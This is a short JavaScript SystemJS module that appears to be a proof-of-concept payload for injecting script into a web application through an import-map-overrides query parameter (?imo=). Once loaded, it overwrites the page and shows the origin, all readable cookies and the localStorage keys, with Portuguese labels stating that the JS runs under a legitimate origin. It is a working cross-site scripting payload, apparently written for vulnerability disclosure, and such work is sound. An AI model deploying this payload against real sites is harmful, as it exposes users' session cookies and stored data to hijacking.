System.register([],function(){return{execute:function(){
document.title='POC-IMO-HROS';
var d=document;
d.body.innerHTML='<div style="margin:40px auto;max-width:480px;font-family:Arial,sans-serif">'
+'<div style="background:#e53935;color:#fff;padding:12px 16px;border-radius:8px;margin-bottom:24px">'
+'<b>IMO PoC</b> — JS executando sob origem legítima</div>'
+'<table style="width:100%;font-size:13px;border-collapse:collapse">'
+'<tr><td style="padding:6px;font-weight:bold">Origin</td><td style="padding:6px">'+location.origin+'</td></tr>'
+'<tr><td style="padding:6px;font-weight:bold">Cookies</td><td style="padding:6px;word-break:break-all">'+(document.cookie||'(none)')+'</td></tr>'
+'<tr><td style="padding:6px;font-weight:bold">localStorage keys</td><td style="padding:6px;word-break:break-all">'+(function(){try{return Object.keys(localStorage).join(', ')||'(empty)'}catch(e){return '(blocked)'}})()+'</td></tr>'
+'</table>'
+'<div style="margin-top:16px;font-size:12px;color:#999">Injetado via ?imo= — import-map-overrides</div></div>';
}}})
